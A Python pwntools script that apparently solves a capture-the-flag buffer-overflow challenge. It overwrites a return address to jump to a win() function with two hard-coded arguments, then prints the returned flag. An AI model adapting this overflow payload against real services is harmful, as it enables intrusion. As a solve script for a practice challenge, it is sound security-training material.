#!/usr/bin/env python3

import argparse
from pwn import *

def main():
  # Parse command-line arguments
  parser = argparse.ArgumentParser(description="Exploit script using Pwntools")
  parser.add_argument(
    "host", type=str,
    help="The hostname or IP address to connect to",
  )
  parser.add_argument(
    "port", type=int,
    help="The port number of the service to connect to",
  )
  args = parser.parse_args()
  
  # Define payload components
  buffer_size = 100
  padding = 8
  
  # Use Pwntools' p32 for packing integers in little-endian format
  vuln_return_address = p32(0x08049296)
  arg1 = p32(0xCAFEF00D)
  arg2 = p32(0xF00DF00D)
  
  # Construct the payload
  payload = b'A' * buffer_size      # Buffer overflow padding
  payload += b'B' * padding         # Additional padding
  payload += b'C' * 4               # Overwrite saved EBP (if applicable)
  payload += vuln_return_address    # Address *to jump* to win()
  payload += b'0' * 4               # Return address *for* win() function
  payload += arg1                   # First argument for the function
  payload += arg2                   # Second argument for the function
  payload += b'\n'                  # Newline to indicate end of payload
  
  # Establish a remote connection using Pwntools
  try:
    with remote(args.host, args.port) as connection:
      # Receive initial banner or prompt from the server
      initial_response = connection.recvuntil(b"> ")  # Adjust delimiter as needed
      print(initial_response.decode('utf-8'))
      
      # Send the crafted payload
      connection.send(payload)
      
      # Receive and print the flag or response
      flag = connection.recvline(timeout=5)
      print(flag.decode('utf-8').strip())
  except Exception as e:
    print(f"An error occurred: {e}")

if __name__ == "__main__":
  main()

